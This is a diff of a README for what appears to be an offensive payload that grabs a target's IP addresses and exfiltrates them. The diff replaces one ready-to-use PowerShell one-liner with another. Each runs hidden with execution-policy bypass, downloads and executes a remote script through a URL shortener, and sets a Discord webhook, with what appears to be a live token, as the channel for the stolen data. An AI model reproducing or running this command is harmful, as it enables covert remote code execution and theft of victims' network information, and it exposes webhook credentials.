@@ -35,7 +35,7 @@ This payload is meant to do grab your targets IP addresses and exfil them with d
 Fill in either or both of these to methods to exfil your collected data
 
 ```
-powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1092996374183813211/Ug1p0cHdytWWGCq7iVR7-JOawkHT0_mLZazlmjM1DSkbLSZA0MumO4xKCmdMX9gc4cez';irm tinyurl.com/ipgrabber3 | iex
+powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1092997498089521183/ZzWeOZRzAfNWtqXfzLDv47DMWokwf-yMbhL-px977t0sqqTGDuT9YmI27cIKRrxF9Tza';irm tinyurl.com/ipgrabber3 | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
